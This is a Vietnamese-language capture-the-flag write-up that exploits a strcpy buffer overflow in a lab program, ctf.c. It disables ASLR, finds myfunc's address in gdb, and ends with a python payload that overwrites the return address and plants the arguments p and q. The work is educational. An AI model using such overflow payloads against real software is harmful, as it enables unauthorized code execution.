# 2. Conduct attack on ctf.c

![alt text](images/image-24.png)

Hàm vuln() sử dụng strcpy(buf,s) để sao chép đầu vào s vào mảng buf[100]. Tuy nhiên, hàm strcpy không kiểm tra đầu vào, nên nếu chuỗi s nhập hơn 100 ký tự, nó sẽ ghi đè lên các byte lân cận, gây ra buffer overflow

![alt text](images/image-25.png)

mục tiêu là đè địa chỉ trả về của hàm vuln thành địa chỉ của hàm myfunc thì mới có thể chạy được hàm myfunc

Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên:

`sudo sysctl -w kernel.randomize_va_space=0`

![alt text](images/image-26.png)

biên dịch chương trình ctf.c

![alt text](images/image-27.png)

chạy gdb để xem địa chỉ của hàm myfunc:

![alt text](images/image-28.png)

=> Địa chỉ: 0x0804851b

=> chúng ta cần chèn 104 bytes + '\x1b\x85\x04\x08'

Stack sau khi đè lên giá trị trở về của hàm vuln():

![alt text](images/image-30.png)

Giờ để lấy được flag ta cần phải vượt qua các chướng ngại vật sau:

- flag1.txt chưa có => phải tạo ra 1 file flag1.txt bằng lệnh `touch flag1.txt`
  
  ![image](https://github.com/user-attachments/assets/59dfac7f-00b2-420a-8c50-831f97decfdb)

- 2 tham số p,q của hàm myfunc chưa có trong stack, vì thế ta đè tiếp biến ebp và giá trị trả về của hàm main thành các flag của p,q

![image](https://github.com/user-attachments/assets/cb0204df-7af7-43d1-b5a6-f666c5e45e98)

=> Câu lệnh cuối cùng:

`./ctf.out $(python -c "print('a' * 104 + '\x1b\x85\x04\x08' + 'a'*4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`

- `'a' * 104`: chèn giá trị cho biến buf và biến ebp 
- `'\x1b\x85\x04\x08'` gán địa chỉ của hàm myfunc() đến địa chỉ trả về của hàm vuln()
- `'a'*4` gán giá trị cho biến s của hàm vuln
- `'\x11\x12\x08\x04'` gán địa chỉ p đến ebp của hàm main()
- `'\x62\x42\x64\x44'` gán địa chỉ q đến giá trị trở về của hàm main()

=> kết quả: 
  
![alt text](images/image-31.png)


